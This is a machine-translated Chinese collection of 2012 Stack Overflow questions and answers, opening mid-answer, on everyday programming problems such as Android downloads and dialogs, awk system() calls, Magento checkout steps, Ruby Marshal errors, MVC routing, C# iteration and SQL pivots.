但是，我建议您使用[Amazon CloudFront 服务](http://aws.amazon.com/cloudfront/)来流式传输您的内容。他们为通常很难下载的视频签名了 URL，因为它们会在一段时间后过期，但肯定不是不可能的。

# iphone - Phonegap - 在浏览器中打开链接，嵌入视频除外

> ID：13360507
> 
> 赞同：0
> 
> 时间：2012-11-13T12:09:58.257
> 
> 标签：iphone, cordova, hyperlink, webview, external

我正在使用 Phonegap 开发应用程序，目标设备是 Android 或 iOS 驱动的。我的问题是，在 iPhone 上我只能将“在 webview 中打开所有白名单 url”参数设置为 true 或 false。这就是问题所在：

预期结果： - 所有链接（如 www.google.com、www.stackoverflow.com）应在浏览器中打开 - 带有 Youtube 视频的嵌入式 iFrame 应在 Web 视图中打开

将“OpenAllWhitelistUrlsInWebview”设置为 true 的结果 - 所有链接和 iFrame 都将在 Webview 中打开

将“OpenAllWhitelistUrlsInWebview”设置为 false 的结果 - 没有链接和 iFrame 将在 Web 视图中打开

我如何指定哪些链接应该在浏览器中打开，哪些不应该？当我从白名单中删除一个 url 时，链接根本不会打开，并且设置 target="_blank" 也无法正常工作。尝试使用 window.open 也没有用。

非常感谢你的每一个想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T13:01:30.867

在周末实施，效果很好： [http ://www.rigelgroupllc.com/blog/2012/05/22/opening-links-in-phonegap-apps-in-mobile-safari/](http://www.rigelgroupllc.com/blog/2012/05/22/opening-links-in-phonegap-apps-in-mobile-safari/)

这将允许您为 youtube 视频设置 plist，同时使用上述方法在外部浏览器中打开指定的链接。

我不确定你是否需要在 Android 中做任何事情。

# android - 安卓应用下载文件

> ID：13360511
> 
> 赞同：3
> 
> 时间：2012-11-13T12:10:36.050
> 
> 标签：android, httpurlconnection, urlconnection

我当前的 Android 应用程序下载了许多音频文件。当我使用此代码执行下载时，我得到文件未找到异常：

```
try {

    final URL downloadFileUrl = new URL("http://filelocation/url.m4a");
    final HttpURLConnection httpURLConnection = (HttpURLConnection) downloadFileUrl.openConnection();
    httpURLConnection.setRequestMethod("GET");
    httpURLConnection.setDoOutput(true);
    httpURLConnection.setConnectTimeout(10000);
    httpURLConnection.setReadTimeout(10000);
    httpURLConnection.connect();

    mTrackDownloadFile = new File(Record.this.getCacheDir(), "mediafile");
    mTrackDownloadFile.createNewFile();
    final FileOutputStream fileOutputStream = new FileOutputStream(mTrackDownloadFile);
    final byte buffer[] = new byte[16 * 1024];

    final InputStream inputStream = httpURLConnection.getInputStream();

    int len1 = 0;
    while ((len1 = inputStream.read(buffer)) > 0) {
        fileOutputStream.write(buffer, 0, len1);
    }
    fileOutputStream.flush();
    fileOutputStream.close();

} catch (final Exception exception) {
    Log.i(TAG, "doInBackground - exception" + exception.getMessage());
    exception.printStackTrace();
    mTrackDownloadFile = null;
} 
```

当我使用此代码时，它工作正常：

```
try {

    final URL downloadFileUrl = new URL("http://filelocation/url.m4a");
    final URLConnection urlConnection = downloadFileUrl.openConnection();

    mTrackDownloadFile = new File(PlayOpponent.this.getCacheDir(), "mediafile");
    mTrackDownloadFile.createNewFile();
    final FileOutputStream fileOutputStream = new FileOutputStream(mTrackDownloadFile);
    final byte buffer[] = new byte[16 * 1024];

    final InputStream inputStream = urlConnection.getInputStream();

    int len1 = 0;
    while ((len1 = inputStream.read(buffer)) > 0) {
        fileOutputStream.write(buffer, 0, len1);
    }
    fileOutputStream.flush();
    fileOutputStream.close();
} catch (final Exception exception) {
    Log.i(TAG, "doInBackground - exception" + exception.getMessage());
    exception.printStackTrace();
    mTrackDownloadFile = null;
} 
```

有人可以指出我哪里出错了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T15:37:54.110

根据这个[博客](http://comments.gmane.org/gmane.comp.handhelds.android.devel/195330)删除

```
httpURLConnection.setDoOutput(true); 
```

在您的代码中可能会解决问题。据说是ICS问题。

# awk - AWK - 例如解释

> ID：13360517
> 
> 赞同：0
> 
> 时间：2012-11-13T12:11:00.270
> 
> 标签：awk, system

我有一个文件**1**：

```
1
2
3 
```

此命令打印：

```
$ awk 'BEGIN{system("cat " 1)}'
1
2
3 
```

.

```
$ awk 'BEGIN{system( "cat '\''" 1 "'\''") }'
1
2
3 
```

我将文件名从“ **1** ”更改为“ **one** ”

我有一个**文件**：

```
1
2
3 
```

现在，该命令不起作用：

```
$ awk 'BEGIN{system("cat " one)}' 
| 
```

.

```
$ awk 'BEGIN{system( "cat '\''" one "'\''") }'
cat: : No such file or directory 
```

为什么现在命令不起作用？

谢谢你的解释。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:37:21.923

在您的示例中， awk 解释`1`为文字 1 和`one`没有值的变量。这意味着`system`正在尝试执行`cat {empty}`or `cat ''`。

尝试这个：

```
awk 'BEGIN{one = "one" ; system("cat " one)}' 
```

或者：

```
awk 'BEGIN{system("cat one")}' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:38:31.437

如果你的文件名是一个数字，你可以直接在 system() 中写入数字，awk 会在内部将它转换为字符串值。您甚至可以编写表达式来获取数字作为结果。例如：

`system("cat "4-3)`也应该适用于您的“1”案例。要查看差异，您可以将文件命名为“1+1”然后`system("cat "1+1)`不起作用，它会抱怨文件“2”不存在。

对于“one”示例：system() 中的“one”不像字符串“one”，而是一个名为“one”的变量。在 awk 中，如果未分配变量，则其默认值为空字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:26:23.627

在 awk 中，`1`具有的值`1`和命名的变量`one`是一个空字符串。`"cat" 1`字符串也是如此`cat 1`，但`"cat" one`字符串也是如此`cat`。string`"cat '\''" one "'\''"`是 string `cat ''`，因此您将空字符串作为第一个参数传递给 cat。

# asp.net - 如何使用来自 jquerymobile 的安全 REST 服务

> ID：13360519
> 
> 赞同：0
> 
> 时间：2012-11-13T12:11:03.513
> 
> 标签：asp.net, asp.net-mvc-3, rest, jquery-mobile, forms-authentication

我开发了一个 HTML/Jquery 移动应用程序，它通过从我使用 MVC3 编写的 REST Web 服务获取数据来工作。目前该服务是开放的，一切都很好。但是我必须实施某种身份验证来保护服务，所以我让用户通过移动应用程序注册。我打算做的是使用我的控制器或操作上的 [Authorize] 属性来实现 ASP.NET 成员资格等。我的问题是

*   如何让通过 jquery 通信的客户端调用此安全服务
*   ASP.NET 成员资格是解决此问题的最佳方式，还是我可以实现其他类型的安全性

带有一些示例代码的教程或博客就足够了，一旦我做对了，我会很好地在这里发布解决方案。

感谢并随时提出您对此可能有的任何问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:56:21.403

看看[这个 Q&A](https://stackoverflow.com/questions/12629530/how-to-customize-asp-net-web-api-authorizeattribute-for-unusual-requirements)，它描述了为 Web API 创建一个自定义 AuthorizeAttribute，它还使用 http 基本身份验证对用户进行身份验证，并从 HTTP 标头中获取凭据。请注意，ASP.NET Web API (System.Web.Http.AuthorizeAttribute) 与 MVC 控制器 (System.Web.Mvc.AuthroizeAttribute) 有不同的 AuthorizeAttribute。他们有不同的行为。您不希望将对 Web API 的调用重定向到登录页面。

客户端的代码看起来像这样调用 REST Web 服务。

```
 getAuthorizationHeader = function (username, password) {
    var up = $.base64.encode(username + ":" + password);
    authType = "Basic " + up;
    return authType;
   },

    $.ajax({
        url: _url,
        data: _data,
        type: _type,
        beforeSend: function (xhr) {
            xhr.setRequestHeader("Authorization", getAuthorizationHeader(username, password));

        },
        success: ajaxSuccessHandler,
        error: ajaxErrHandler
    }); 
```

beforeSend 事件用于将凭据放入 HTTP 标头中。您仍然希望使用 HTTPS/SSL 来确保安全。仅对用户名/密码进行编码是不够的安全性。

# magento - Magento 将步骤添加到 Onepage 结帐

> ID：13360520
> 
> 赞同：3
> 
> 时间：2012-11-13T12:11:10.260
> 
> 标签：magento, magento-1.7

我正在尝试在单页结帐中添加一个非常基本的（实际上只是一个带有一些文本和一个继续按钮的 div）步骤，但结果很短，因为它们不起作用（我怀疑这是因为它们是在之前创建的1.7.0.2)，当遵循[此处 (Fontis)](http://www.fontis.com.au/blog/magento/adding-step-onepage-checkout)、[此处 (incho)](http://inchoo.net/ecommerce/magento/adding-a-new-tab-under-one-page-checkout-full-working-module/)和[此处 (Magento 论坛)](http://www.magentocommerce.com/boards/viewthread/6775/)的示例时。

我还尝试将来自不同示例和论坛帖子的内容结合起来，但在我尝试这样做的一周中，我没有得到任何结果。

有人向我推荐了《Php Architect's Guide to E-Commerce Programming with Magento》一书，我已经购买并将开始阅读，但我想知道是否有人能指出我在 1.7.0.2 中添加新步骤的正确方向的单页结帐？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T13:53:38.687

我按照本指南在 1.7.0.2 中成功完成了此操作：

[http://www.excellencemagentoblog.com/magento-onestep-checkout-add-step](http://www.excellencemagentoblog.com/magento-onestep-checkout-add-step)

总之，您需要扩展/覆盖 Mage_Checkout_Block_Onepage::getSteps() 以在序列中添加新步骤。

创建新步骤的块/模板（在上一步完成时使用 Ajax 请求加载）您的块类将需要扩展：Mage_Checkout_Block_Onepage_Abstract

您还需要扩展 onepagecheckout javascript，因为这完成了很多繁重的工作。Prototype 库有一个很好的方法来做到这一点。

最后，您需要扩展控制器类 (Mage_Checkout_OnepageController) 以覆盖任何现有步骤的响应，返回新步骤的内容（使用 ajax 加载），并处理您输入的任何数据（表单字段等）的保存操作新的一步。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-12-11T06:01:07.010

默认情况下，magento 提供了一些结帐步骤。但有时您需要添加来自客户的额外信息以供将来参考。一个常见的请求自定义是在默认结帐过程中添加自定义表单。这不是接触核心文件的好习惯。您可以通过覆盖模块来做到这一点。在此示例中，公司名称为**Ipragmatech**，模块名称为**Checkoutstep**。

Step1：在结账过程中添加自定义步骤

打开 Ipragmatech > Checkoutstep > Block > Onepage> Checkoutstep.php 文件并编写以下代码

```
 class Ipragmatech_Checkoutstep_Block_Onepage_Checkoutstep extends Mage_Checkout_Block_Onepage_Abstract
    {
       protected function _construct()
       {     
          $this->getCheckout()->setStepData('checkoutstep', array(
          'label'     => Mage::helper('checkout')->__('Invitation to participation'),
          'is_show'   => true
        ));
        parent::_construct();
       }
     } 
```

步骤 2：在结帐过程中添加您想要的步骤和位置

打开 Ipragmatech > Checkoutstep > Block > Onepage> Checkoutstep.php 文件并编写以下代码

```
 class Ipragmatech_Checkoutstep_Block_Onepage extends Mage_Checkout_Block_Onepage
    {
      public function getSteps()
      {
             $steps = array();

             if (!$this->isCustomerLoggedIn()) {
                $steps['login'] = $this->getCheckout()->getStepData('login');
             }

            $stepCodes = array('billing', 'shipping', 'shipping_method', 'payment', 'checkoutstep', 'review');
         foreach ($stepCodes as $step) {
             $steps[$step] = $this->getCheckout()->getStepData($step);
          }

    return $steps;
   }
} 
```

Step3：抓取自定义表单的提交值，设置自定义表单的值

打开 ipragmatech > Checkoutstep > controllers > OnepageController.php 并编写以下函数

```
 public function saveCheckoutstepAction()
    {
      $this->_expireAjax();
      if ($this->getRequest()->isPost()) {

     //Grab the submited value 
     $_entrant_name = $this->getRequest()->getPost('entrant_name',"");
     $_entrant_phone = $this->getRequest()->getPost('entrant_phone',"");
     $_entrant_email = $this->getRequest()->getPost('entrant_email',"");
     $_permanent_address = $this->getRequest() ->getPost('permanent_address',"");
     $_address = $this->getRequest()->getPost('local_address',"");

     Mage::getSingleton('core/session') ->setIpragmatechCheckoutstep(serialize(array(
    'entrant_name' =>$_entrant_name,
    'entrant_phone' =>$_entrant_phone,
    'entrant_email' =>$_entrant_email,
    'permanent_address' =>$_permanent_address,
    'address' =>$_address
     )));

    $result = array();
    $redirectUrl = $this->getOnePage()->getQuote()->getPayment() ->getCheckoutRedirectUrl();
        if (!$redirectUrl) {
            $this->loadLayout('checkout_onepage_review');
            $result['goto_section'] = 'review';
            $result['update_section'] = array(
                'name' => 'review',
                'html' => $this->_getReviewHtml()
            );

        }

        if ($redirectUrl) {
            $result['redirect'] = $redirectUrl;
        }

        $this->getResponse()->setBody(Zend_Json::encode($result));
    }
} 
```

Step4：保存自定义表单信息

当调用 checkout_onepage_controller_success_action 事件挂钩时。打开 Ipragmatech > Checkoutstep > Model >Observer.php 并编写以下内容

```
 class Ipragmatech_Checkoutstep_Model_Observer {
      const ORDER_ATTRIBUTE_FHC_ID = 'checkoutstep';
      public function hookToOrderSaveEvent() {
      if (Mage::helper('checkoutstep')->isEnabled()) {
         $order = new Mage_Sales_Model_Order ();
         $incrementId = Mage::getSingleton ( 'checkout/session' )->getLastRealOrderId ();
         $order->loadByIncrementId ( $incrementId );

       // Fetch the data 
       $_checkoutstep_data = null;
       $_checkoutstep_data = Mage::getSingleton ( 'core/session' )->getIpragmatechCheckoutstep ();
       $model = Mage::getModel ( 'checkoutstep/customerdata' )->setData ( unserialize ( $_checkoutstep_data ) );
       $model->setData ( "order_id",$order["entity_id"] );
       try {
           $insertId = $model->save ()->getId ();
             Mage::log ( "Data successfully inserted. Insert ID: " . $insertId, null, 'mylog.log');
        } catch ( Exception $e ) {
            Mage::log ( "EXCEPTION " . $e->getMessage (), null, 'mylog.log' );
          }
        }
    } 
```

}

Magento – 在结帐扩展中添加自定义表单是一个完整的解决方案，可以在您的电子商务网站的结帐过程中添加额外的步骤。它允许管理员以 CSV 格式从自定义表中导出数据。访问链接以获取此免费扩展[http://www.magentocommerce.com/magento-connect/custom-form-in-checkout.html](http://www.magentocommerce.com/magento-connect/custom-form-in-checkout.html)

# android - JSON合并android中的两个响应

> ID：13360521
> 
> 赞同：1
> 
> 时间：2012-11-13T12:11:10.130
> 
> 标签：android, json

我正在使用 JSON 从我的服务器获取响应。这是代码：

```
HttpClient httpclient = new DefaultHttpClient();
        HttpClient httpclient2 = new DefaultHttpClient();
        HttpResponse response;
        HttpResponse response2;
        try {
            HttpGet request = new HttpGet(GlobalConfig.getMagazineUrl());
            HttpGet request2 = new HttpGet(GlobalConfig.getMagazinePagesUrl(1));

            request.addHeader("Authorization", "Basic " + Base64.encodeToString(
                                            (GlobalConfig.getAuthString()).getBytes(),Base64.NO_WRAP));
            request2.addHeader("Authorization", "Basic " + Base64.encodeToString(
                    (GlobalConfig.getAuthString()).getBytes(),Base64.NO_WRAP));
            response = httpclient.execute(request);
            StatusLine statusLine = response.getStatusLine();
            response2 = httpclient2.execute(request2);
            StatusLine statusLine2 = response2.getStatusLine();

            if(statusLine.getStatusCode() == HttpStatus.SC_OK && statusLine2.getStatusCode() == HttpStatus.SC_OK){
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                ByteArrayOutputStream out2 = new ByteArrayOutputStream();

                response.getEntity().writeTo(out);
                response2.getEntity().writeTo(out2);

                out.close();
                out2.close();
                return parser(out.toString(), out2.toString()); 
```

正如你所看到的，`parser(out.toString(), out2.toString())`我将两个响应都返回为字符串。我想知道如何将这两个 JSON 响应合并为一个。我不想合并两个字符串，我需要在一个大响应中合并两个 JSON 响应。这个有可能？如果是，我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:45:12.617

也许这就是你想要的：

```
...
JSONObject json = new JSONObject();
json.put("response1", new JSONObject(out.toString()));
json.put("response2", new JSONObject(out2.toString())); 
```

现在根据返回类型*返回*或`json.toString()`返回。`json`

# wordpress - 21 个响应式菜单 - 向下打开

> ID：13360522
> 
> 赞同：0
> 
> 时间：2012-11-13T12:11:18.723
> 
> 标签：wordpress, wordpress-theming

如何使二十一十二主题中的响应式菜单向下打开？当窗口太小而无法显示每个菜单项时，菜单会压缩为一个按钮 MENU。如果单击它，您可以看到菜单项，但它们向上打开。我该如何改变？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T04:39:28.200

看起来菜单链接已经出现在按钮下方，至少在[Wordpress 现场演示](http://twentytwelvedemo.wordpress.com/)中。如果这对您没有任何帮助，您可以尝试一些 jQuery 魔术：

```
<script type="text/javascript">
$(function(){
    $('.menu-toggle').click(function(){
        $('#menu-main-menu').slideToggle();
    });
});
</script> 
```

# ruby - Marshal 无法使用默认 proc 转储哈希 (TypeError)

> ID：13360541
> 
> 赞同：4
> 
> 时间：2012-11-13T12:12:08.097
> 
> 标签：ruby, marshalling

我有这个 ruby​​ 脚本，它生成一个哈希并将其保存到一个文件中。

有时文件不存在或为空，所以我总是先检查它的存在。然后我将旧值加载到我的哈希中并尝试再次保存。我已经为此苦苦挣扎了很长时间。这是一个示例：

```
newAppName = ARGV[0]
newApp = Hash.new
newApp["url"] = ARGV[1]
newApp["ports"] = ARGV[2].to_i

apps = Hash.new { |h, k| h[k] = Hash.new }
# apps["test"] = {"url" => "www.test.com", "ports" => 3 }

appsFile = '/home/test/data/apps'

if File.exists?(appsFile)
  apps = Marshal.load File.read(appsFile)
else
  puts "Inserting first app into list..."
end

apps[newAppName] = newApp

serialisedApps = Marshal.dump(apps) # This line is where I get the error

File.open(appsFile, 'w') {|f| f.write(serialisedApps) } 
```

现在我得到这个错误：

```
script.rb:53:in `dump': can't dump hash with default proc (TypeError)` 
```

这是什么意思？我的哈希错了吗？我如何解决它？

我尝试使用 irb 手动执行它，它工作正常，尽管我在 Mac 上进行了测试，并且该脚本在 Linux 中运行。他们不应该表现不同，对吧？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-13T12:40:46.843

Ruby 没有`Marshal`代码格式，只有数据格式。您不能编组`Proc`s 或 lambdas。

你的`apps`哈希有一个`default_proc`, 因为

```
hsh = Hash.new { some_block } 
```

或多或少与

```
hsh = {}
hsh.default_proc = ->{ some_block } 
```

IOW：您的`apps`哈希包含代码，并且无法编组代码。

# php - Wordpress - 更改文章中的图像但保留属性

> ID：13360544
> 
> 赞同：0
> 
> 时间：2012-11-13T12:12:19.627
> 
> 标签：php, wordpress

就像主题所说：有没有办法在现有的 wordpress 文章中更改图像，同时保留该图像的所有定义属性，如描述等？也许是插件？

此致，

斯蒂芬·S。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:26:57.600

插件[启用媒体替换](http://wordpress.org/extend/plugins/enable-media-replace/)应该可以满足您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-20T09:31:04.580

我刚刚测试了插件启用媒体替换（如 emartel 建议的那样），它现在似乎也更新了包含受影响图像或将其用作特色图像的帖子。
预览（刚上传后）仍然显示旧图像，但后来在库中它似乎被替换并且似乎可以工作。

# asp.net-mvc-3 - 在 MVC 3 项目中找不到控制器 - NotFound 错误

> ID：13360548
> 
> 赞同：1
> 
> 时间：2012-11-13T12:12:31.313
> 
> 标签：asp.net-mvc-3, controller, global-asax, file-not-found, maproute

我有这个带有以下代码的 global.asax 文件：

```
routes.MapRoute("Invitations", 
                        "api/invitations", 
                        new { controller = "Invitations", action = "Invitation"}); 
```

我有一个控制器：

```
public class InvitationsController : Controller
{
    [HttpPut]
    public JsonResult Invitation(InvitationResponse invitationResponse)
    {
        //code
    }
} 
```

我正在通过 HttpWebRequest 使用以下 URL 访问控制器：

```
"http://localhost:6055/API/Invitations" 
```

当我运行它时，我收到错误“NotFound”。

编辑：

全球航线：

routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

```
 routes.MapRoute("Users",
                        "api/users/{id}",
                        new { controller = "Users", action = "UserAction", id = UrlParameter.Optional });

        routes.MapRoute("CheckIn",
                        "api/checkins",
                        new { controller = "CheckIn", action = "CheckIn" });

        routes.MapRoute("Appointments",
                        "api/appointments/{id}",
                        new { controller = "Appointments", action = "Appointment", id = UrlParameter.Optional });

        routes.MapRoute("UserAppointments",
                        "api/users/{userId}/appointments/{startDate}",
                        new { controller = "Appointments", action = "UserAppointments", startDate = UrlParameter.Optional });

        routes.MapRoute("UserInvitations",
                        "api/users/{userId}/invitations",
                        new { controller = "Invitations", action = "UserInvitations" });

        routes.MapRoute("UserOverview",
                        "api/users/{id}/overview",
                        new { controller = "Users", action = "Overview" });

        routes.MapRoute("Invitations", 
                        "api/invitations", 
                        new { controller = "Invitations", action = "Invitation"});

        routes.MapRoute(
            "Default", // Route name
            "{controller}/{action}/{id}", // URL with parameters
            new { controller = "Home", action = "Index", id = UrlParameter.Optional } // Parameter defaults
        ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:17:09.477

“http://localhost:6055/API/Invitations”看起来不正确，不是吗？

“http://localhost:6055/ **YourApp** /API/Invitations”

# actionscript-3 - ActionScript3 图像变形/变形

> ID：13360551
> 
> 赞同：0
> 
> 时间：2012-11-13T12:12:43.963
> 
> 标签：actionscript-3

我正在处理 actionscript 3 中的应用程序

我需要一些脚本来对图像产生效果，尤其是人脸图片

类似于这些：

[https://play.google.com/store/apps/details?id=net.andhat.FunnyFaceFree](https://play.google.com/store/apps/details?id=net.andhat.FunnyFaceFree)

任何想法？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T15:42:42.350

您将需要使用置换贴图。在 Google 上可以找到大量教程。

# c# - 在每次迭代中有条件地使用不同数量的项目

> ID：13360555
> 
> 赞同：1
> 
> 时间：2012-11-13T12:13:01.650
> 
> 标签：c#, iterator, iteration

我想这真的很简单，只是涉及使用迭代器和 .MoveNext() 方法。

但是假设您正在遍历一个集合，您在集合上做了一些工作，但是根据每个“循环”中的某些条件，您可能必须抓取 2 个或更多项目并基本上跳过它们，这样您就不会在接下来循环它们.

例子：

```
foreach (Fish fish in ParcelOfFish)
{
    GiverPersonFish(fish);
} 
```

在这里，我只是遍历 Fish 的集合并将它们传递给一个方法。有些鱼很小，所以我必须再给那个人一条，这样它就不会饿死。

```
foreach (Fish fish in ParcelOfFish)
{
    GiverPersonFish(fish);

    if (fish.IsSmall)
    {
        GiverPersonFish(ParcelOfFish.MoveNext()); // here I want to give him the next fish
    }
} 
```

这将如何工作，以便我给出的第二条鱼不会在下一个循环中迭代？

同样为了使这个更棘手，一个人可能会得到一条大鱼和一条小鱼是不公平的，所以每当有一条小鱼时，我都不想从迭代中抓住另一条小鱼然后继续。

所以如果订单是

```
Small
Big
Big
Small
Big
Small 
```

在第一个“循环”之后，他会得到两个小的（索引 0 和 3），它将像这样遍历其余部分：

```
Big
Big
Big
Small 
```

编译器似乎不喜欢在迭代时像这样修改迭代。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:15:11.000

迭代，按照设计，并不意味着像这样工作。如果您需要更灵活的行为，您应该使用 for 循环。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T13:02:18.233

其实可以通过`Enumerator`

```
using (var enumerator = ParcelOfFish.GetEnumerator())
{
    // Bla bla whatever you need, but remember the first call to .MoveNext();
    if (!enumerator.MoveNext())
            break;

    // Your actions here. MoveNext() is bool and proceeds to the new item.
    // Try using while (!condition) { } here.
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:21:21.510

不要使用 foreach 循环 ( `foreach(Foo foo in bar)`)，而是使用普通的旧 for 循环 ( `for(int i = 0; i < bar.Length; i++)`)。

这将使您可以执行以下操作：

```
for (int i = 0; i < ParcelOfFish.Length; i++)
{
    Fish fish = ParcelOfFish[i];
    GiverPersonFish(fish);

    if (fish.IsSmall && i+1 < ParcelOfFish.Length)
    {
        GiverPersonFish(ParcelOfFish[++i]); // give him the next fish
    }
} 
```

使用 for 循环还可以让您在列表中查看另一条小鱼，将其交给此人，然后将其从列表中删除（这次假设 ParcelOfFish 是列表，而不是数组）：

```
for (int i = 0; i < ParcelOfFish.Count; i++)
{
    Fish fish = ParcelOfFish[i];
    GiverPersonFish(fish);

    if (fish.IsSmall)
    {
        for (int j = i+1; j < ParcelOfFish.Count; j++)
        {
            Fish fish2 = ParcelOfFish[j];
            if (fish2.IsSmall)
            {
                GiverPersonFish(fish2); // give him the next small fish
                ParcelOfFish.RemoveAt(j);
                break;                    
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T12:28:13.003

我会改用队列。

```
var queue = new Queue<Fish>(ParcelOfFish);
while (queue.Count > 0)
{
    var fish = queue.Dequeue();

    if (fish.IsSmall && queue.Count > 0) 
    {
        var fish2 = queue.Dequeue();

        if (fish2.IsSmall)
            GiverPersonFish(fish); // give them the first small fish
        else
            queue.Enqueue(fish); // throw it back to the end of the queue

        GiverPersonFish(fish2);
    }
    else
        GiverPersonFish(fish);
} 
```

也适用于堆栈。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-13T12:35:17.010

尝试

```
Enumerator<Fish> enumerator = ParcelOfFish.GetEnumerator();
Queue<Fish> bigFishCache = new Queue<Fish>(){ };
Boolean smallFishSwitch = false;

while(enumerator.MoveNext())
{
    if(smallFishSwitch)
    {
        if(enumerator.Current == BigFish)
        {
             bigFishCache.Enqueue(enumerator.Current);
        }
        else
        {
             smallFishSwitch = false;
             GivePersonFish(enumerator.Current);
             ForEach(Fish fish in bigFishCache)
             {
                  GivePersonFish(fish);
             }
             bigFishCache.Clear();
        }
    }
    else
    {
        smallFishSwitch = enumerator.Current == SmallFish;
        GivePersonFish(enumerator.Current);
    }    
} 
```

# android - 对话框不出现

> ID：13360558
> 
> 赞同：9
> 
> 时间：2012-11-13T12:13:18.003
> 
> 标签：android, dialog

我使用以下代码：

```
public class Settings extends Activity implements OnClickListener {

    private Activity activity;
    private AlertDialog.Builder builder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.settings);

        Button bAdd = (Button) findViewById(R.id.bAdd);
        bAdd.setOnClickListener(this);

        activity = this;
        builder = new AlertDialog.Builder(activity);
        builder.setMessage("message")
           .setTitle("title");

    }

    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        switch (v.getId()) {
        case R.id.bAdd:
            AlertDialog dialog = builder.create();
            break;
        }

    }

} 
```

但是由于某种原因，我的弹出窗口没有出现，也什么都不做。关于导致此故障的原因有什么想法吗？谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T12:14:55.477

您必须调用`show()`方法而不是`create()`.

**注意：** `create()`方法只创建实例，`Dialog`但不会显示它。

一个建议：

您可以创建返回`Dialog`如下的方法：

```
public Dialog createNewDialog(int type) {
   AlertDialog dlg = null;
   switch (type) {
      case SOME_CONSTANT:
         dlg = new AlertDialog.Builder(ActivityName.this / this)
            .setTitle("Title")
            .setMessage("Message")
            .setPositiveButton("Yes", null)
            .create();
      break;
   }
} 
```

然后您可以将其称为：

```
createNewDialog(SOME_CONSTANT).show(); 
```

并且您的`Dialog`将被显示。

特别是在您的情况下，您可以使用以下代码片段实现您的目标：

```
@Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        switch (v.getId()) {
        case R.id.bAdd:
            createNewDialog(SOME_CONSTANT).show();
            break;
        }
    } 
```

希望能帮助到你。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2018-09-13T16:30:04.050

我有这个问题，也许这个答案可以帮助某人。

我正在运行代码以在非 ui 线程上显示 AlertDialog。使用后：

```
runOnUiThread(new Runnable()
    {
        @Override
        public void run()
        {
            ShowAlert();
        }
    }); 
```

AlertDialog 工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:16:39.833

你需要打电话 `builder.show()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-24T19:58:26.437

我有一个类似的问题，在我的情况下，对话框会在几毫秒内出现和消失：要解决它，不要在调用对话框的同一方法中调用 finish() 或 finishActivity()。

```
createNewDialog(SOME_CONSTANT).show();
finish(); 
```

即使在您访问它之前，这也会破坏您的对话框。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-13T12:30:55.647

它没有显示的原因是没有`.show()`被调用`AlertDialog`

```
@Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        switch (v.getId()) {
        case R.id.bAdd:
            AlertDialog dialog = builder.create();
            dialog.show();
            break;
        }

    } 
```

# sql - SQL union 相同的列数，相同的数据类型，不同的数据

> ID：13360561
> 
> 赞同：0
> 
> 时间：2012-11-13T12:13:23.177
> 
> 标签：sql, join, sql-server-2008-r2, union

我有两个结果集，看起来大致如下：

```
Id       Name    Count
1        Asd     1  
2        Sdf     4    
3        Dfg     567    
4        Fgh     23 
```

但是第二个的 Count 列数据是不同的，我希望两者都显示，大约是这样的：

```
Id       Name    Count from set 1    Count from set two
1        Asd     1                   15
2        Sdf     4                   840
3        Dfg     567                 81
4        Fgh     23                  9 
```

如何在 SQL 中执行此操作（如果可能，使用联合）？我当前的 SQL，希望这能更好地解释我想要做什么：

```
(SELECT Id, Name, COUNT(*) FROM Customers where X)
union
(SELECT Id, Name, COUNT(*) FROM Customers where Y) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:36:28.327

```
select * 
from
(
    SELECT 'S1' as dataset, Id, Name, COUNT(*) as resultcount FROM Customers where X
    union
    SELECT 'S2',Id, Name, COUNT(*) FROM Customers where Y
) s
pivot
(sum(resultcount) for dataset in (s1,s2)) p 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:17:28.337

您可以执行以下操作：

```
;WITH Unioned
AS
(
    SELECT 'Set1' FromWhat, Id, Name FROM Table1
    UNION ALL
    SELECT 'Set2', Id, Name FROM Table2
)
SELECT 
  Id, 
  Name,
  SUM(CASE FromWhat WHEN 'Set1' THEN 1 ELSE 0 END) 'Count from set 1',
  SUM(CASE FromWhat WHEN 'Set2' THEN 1 ELSE 0 END) 'Count from set 2'
FROM Unioned
GROUP BY Id, Name; 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!3/cc57d/1)

